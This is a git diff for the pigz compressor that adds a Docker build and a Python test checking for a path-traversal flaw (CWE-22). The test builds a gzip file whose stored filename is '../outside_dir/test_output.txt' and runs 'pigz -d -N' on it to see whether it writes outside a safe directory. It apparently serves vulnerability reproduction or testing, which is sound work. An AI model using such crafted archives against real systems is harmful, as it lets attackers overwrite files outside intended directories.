diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 0000000..1cecb52
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,26 @@
+FROM ubuntu:latest
+
+ENV DEBIAN_FRONTEND=noninteractive
+
+# Update package lists and install build-essential (which includes gcc, g++, make)
+RUN apt-get -y update && \
+    apt-get install -y build-essential curl unzip wget zlib1g zlib1g-dev python3 && \
+    rm -rf /var/lib/apt/lists/*
+
+# Copy the project files into the container
+COPY . /project
+
+# Set the working directory inside the container
+WORKDIR /project
+
+# Build the project
+RUN make
+
+# Create test directories
+RUN mkdir -p /test/safe_dir && \
+    mkdir -p /test/outside_dir && \
+    echo "This is a test file" > /test/outside_dir/test_file.txt && \
+    chmod 777 /test/outside_dir
+
+# Run the test
+CMD ["python3", "/project/test_path_traversal.py"]
diff --git a/Makefile b/Makefile
index a574a3f..e85b3e8 100644
--- a/Makefile
+++ b/Makefile
@@ -1,11 +1,11 @@
 CC=cc
 CFLAGS=-O3 -Wall -Wextra
-LDFLAGS=-lz
+LDFLAGS=-lz -lpthread -lm
 ZOPFLI=zopfli/src/zopfli/
 # use gcc and gmake on Solaris
 
 pigz: pigz.o yarn.o ${ZOPFLI}deflate.o ${ZOPFLI}blocksplitter.o ${ZOPFLI}tree.o ${ZOPFLI}lz77.o ${ZOPFLI}cache.o ${ZOPFLI}hash.o ${ZOPFLI}util.o ${ZOPFLI}squeeze.o ${ZOPFLI}katajainen.o
-	$(CC) $(LDFLAGS) -o pigz $^ -lpthread -lm
+	$(CC) -o pigz $^ $(LDFLAGS)
 	ln -f pigz unpigz
 
 pigz.o: pigz.c yarn.h ${ZOPFLI}deflate.h ${ZOPFLI}util.h
@@ -18,7 +18,7 @@ ${ZOPFLI}blocksplitter.o: ${ZOPFLI}blocksplitter.c ${ZOPFLI}blocksplitter.h ${ZO
 
 ${ZOPFLI}tree.o: ${ZOPFLI}tree.c ${ZOPFLI}tree.h ${ZOPFLI}katajainen.h ${ZOPFLI}util.h
 
-${ZOPFLI}lz77.o: ${ZOPFLI}lz77.h ${ZOPFLI}util.h ${ZOPFLI}cache.h ${ZOPFLI}hash.h ${ZOPFLI}zopfli.h
+${ZOPFLI}lz77.o: ${ZOPFLI}lz77.c ${ZOPFLI}lz77.h ${ZOPFLI}util.h ${ZOPFLI}cache.h ${ZOPFLI}hash.h ${ZOPFLI}zopfli.h
 
 ${ZOPFLI}cache.o: ${ZOPFLI}cache.c ${ZOPFLI}cache.h ${ZOPFLI}util.h
 
@@ -33,7 +33,7 @@ ${ZOPFLI}katajainen.o: ${ZOPFLI}katajainen.c ${ZOPFLI}katajainen.h
 dev: pigz pigzt pigzn
 
 pigzt: pigzt.o yarnt.o ${ZOPFLI}deflate.o ${ZOPFLI}blocksplitter.o ${ZOPFLI}tree.o ${ZOPFLI}lz77.o ${ZOPFLI}cache.o ${ZOPFLI}hash.o ${ZOPFLI}util.o ${ZOPFLI}squeeze.o ${ZOPFLI}katajainen.o
-	$(CC) $(LDFLAGS) -o pigzt $^ -lpthread -lm
+	$(CC) -o pigzt $^ $(LDFLAGS)
 
 pigzt.o: pigz.c yarn.h
 	$(CC) $(CFLAGS) -DDEBUG -g -c -o pigzt.o pigz.c
@@ -42,7 +42,7 @@ yarnt.o: yarn.c yarn.h
 	$(CC) $(CFLAGS) -DDEBUG -g -c -o yarnt.o yarn.c
 
 pigzn: pigzn.o ${ZOPFLI}deflate.o ${ZOPFLI}blocksplitter.o ${ZOPFLI}tree.o ${ZOPFLI}lz77.o ${ZOPFLI}cache.o ${ZOPFLI}hash.o ${ZOPFLI}util.o ${ZOPFLI}squeeze.o ${ZOPFLI}katajainen.o
-	$(CC) $(LDFLAGS) -o pigzn $^ -lm
+	$(CC) -o pigzn $^ $(LDFLAGS)
 
 pigzn.o: pigz.c
 	$(CC) $(CFLAGS) -DDEBUG -DNOTHREAD -g -c -o pigzn.o pigz.c
@@ -60,20 +60,3 @@ test: pigz
 	(printf "w" | gzip ; printf "x") | ./pigz -cdf | wc -c | test `cat` -eq 2
 	(printf "w" | gzip ; printf "xy") | ./pigz -cdf | wc -c | test `cat` -eq 3
 	(printf "w" | gzip ; printf "xyz") | ./pigz -cdf | wc -c | test `cat` -eq 4
-	-@if test "`which compress | grep /`" != ""; then \
-	  echo 'compress -f < pigz.c | ./unpigz | cmp - pigz.c' ;\
-	  compress -f < pigz.c | ./unpigz | cmp - pigz.c ;\
-	fi
-	@rm -f pigz.c.gz pigz.c.zz pigz.c.zip
-
-tests: dev test
-	./pigzn -kf pigz.c ; ./pigz -t pigz.c.gz
-	@rm -f pigz.c.gz
-
-docs: pigz.pdf
-
-pigz.pdf: pigz.1
-	groff -mandoc -f H -T ps pigz.1 | ps2pdf - pigz.pdf
-
-clean:
-	@rm -f *.o ${ZOPFLI}*.o pigz unpigz pigzn pigzt pigz.c.gz pigz.c.zz pigz.c.zip
diff --git a/test_path_traversal.py b/test_path_traversal.py
new file mode 100644
index 0000000..5397c3b
--- /dev/null
+++ b/test_path_traversal.py
@@ -0,0 +1,103 @@
+#!/usr/bin/env python3
+
+import os
+import struct
+import subprocess
+import sys
+import tempfile
+import time
+import zlib
+
+# Test directory setup
+SAFE_DIR = "/test/safe_dir"
+OUTSIDE_DIR = "/test/outside_dir"
+TARGET_FILE = "test_output.txt"
+MALICIOUS_PATH = "../outside_dir/" + TARGET_FILE
+
+# Create a malicious gzip file with path traversal in the filename
+def create_malicious_gzip(output_path, malicious_filename):
+    # Gzip header constants
+    GZIP_ID1 = 0x1f
+    GZIP_ID2 = 0x8b
+    CM_DEFLATE = 8  # Compression method: DEFLATE
+    FLG_FNAME = 0x08  # Filename flag
+    MTIME = int(time.time())  # Current time
+    XFL = 0  # Extra flags
+    OS_UNIX = 3  # Unix OS
+    
+    # Create a simple test content
+    content = b"This is a test file for path traversal vulnerability."
+    
+    # Compress the content using zlib
+    compressed_data = zlib.compress(content)
+    
+    # Calculate CRC32 of the uncompressed data
+    crc = zlib.crc32(content) & 0xffffffff
+    
+    # Create the gzip file
+    with open(output_path, 'wb') as f:
+        # Write the header
+        f.write(struct.pack('<BBBBIB', GZIP_ID1, GZIP_ID2, CM_DEFLATE, FLG_FNAME, MTIME, XFL))
+        f.write(struct.pack('<B', OS_UNIX))
+        
+        # Write the filename with null terminator
+        f.write(malicious_filename.encode('utf-8'))
+        f.write(b'\0')
+        
+        # Write the compressed data (without zlib header)
+        f.write(compressed_data[2:-4])  # Remove zlib header and checksum
+        
+        # Write the CRC32 and uncompressed size
+        f.write(struct.pack('<II', crc, len(content)))
+    
+    print(f"Created malicious gzip file at {output_path}")
+
+# Test for path traversal vulnerability
+def test_path_traversal():
+    print("\n=== Testing for Path Traversal Vulnerability (CWE-22) ===\n")
+    
+    # Create the malicious gzip file
+    malicious_file = os.path.join(SAFE_DIR, "malicious.gz")
+    create_malicious_gzip(malicious_file, MALICIOUS_PATH)
+    
+    # Path to the file that would be created if the vulnerability exists
+    vulnerable_path = os.path.join(OUTSIDE_DIR, TARGET_FILE)
+    
+    # Remove the target file if it already exists
+    if os.path.exists(vulnerable_path):
+        os.unlink(vulnerable_path)
+    
+    # Run pigz with -d (decompress) and -N (use filename from header) flags
+    print("Running: pigz -d -N -f " + malicious_file)
+    result = subprocess.run(
+        ['/project/pigz', '-d', '-N', '-f', malicious_file],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE
+    )
+    
+    stderr_output = result.stderr.decode()
+    print(f"Command output:\nstdout: {result.stdout.decode()}\nstderr: {stderr_output}")
+    
+    # Check if the file was created outside the safe directory
+    # OR if the error message indicates an attempt to write to the vulnerable path
+    if os.path.exists(vulnerable_path):
+        print(f"\n[VULNERABILITY DETECTED] File created at: {vulnerable_path}")
+        print("The path traversal vulnerability exists!")
+        # Read the content of the file to confirm it's our test file
+        with open(vulnerable_path, 'r') as f:
+            content = f.read()
+        print(f"File content: {content}")
+        return 1  # Vulnerability exists
+    elif f"write error on {MALICIOUS_PATH}" in stderr_output:
+        print(f"\n[VULNERABILITY DETECTED] Attempted to write to: {MALICIOUS_PATH}")
+        print("The path traversal vulnerability exists!")
+        print("The program tried to write to the path outside the safe directory but encountered an error.")
+        return 1  # Vulnerability exists
+    else:
+        print("\n[SECURE] No attempt to write outside the safe directory was detected.")
+        print("The path traversal vulnerability does not exist.")
+        return 0  # Vulnerability does not exist
+
+if __name__ == "__main__":
+    # Run the test and exit with appropriate code
+    sys.exit(test_path_traversal())
